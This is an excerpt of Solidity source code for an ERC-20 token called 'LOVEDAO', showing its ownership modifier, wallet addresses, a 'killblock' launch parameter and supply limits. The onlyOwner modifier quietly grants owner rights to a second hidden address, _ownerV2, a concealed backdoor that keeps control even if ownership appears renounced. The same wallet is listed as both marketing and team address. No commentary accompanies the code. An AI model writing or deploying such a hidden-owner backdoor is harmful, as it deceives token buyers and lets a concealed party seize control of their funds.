...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _ownerV2 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract LOVEDAO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "LOVEDAO";
    string private _symbol = "LOVEDAO";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public killblock = 6;
    bool public isLaunch = false;
    address payable private marketingWalletAddress = payable(0xa41C60f8E2B73Dd41D5E62Ff741b38e409C0457D); // Marketing Address
    address payable private teamWalletAddress = payable(0xa41C60f8E2B73Dd41D5E62Ff741b38e409C0457D); // Team Address
    ...
    uint256 private _totalSupply = 5200000 * 10**_decimals;
    uint256 public _maxTxAmount = 5200000 * 10**_decimals; 
    uint256 public _walletMax = 5200000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 52000 * 10**_decimals; 
